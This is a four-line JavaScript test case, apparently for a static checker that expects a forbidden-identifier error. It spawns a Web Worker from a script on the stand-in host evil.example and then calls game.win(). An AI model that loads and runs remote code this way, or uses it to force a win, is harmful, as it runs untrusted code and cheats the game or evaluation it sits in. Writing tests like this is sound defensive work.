// expect: static forbidden-identifier
const helper = new Worker('https://evil.example/helper.js');
helper.postMessage('go');
game.win();
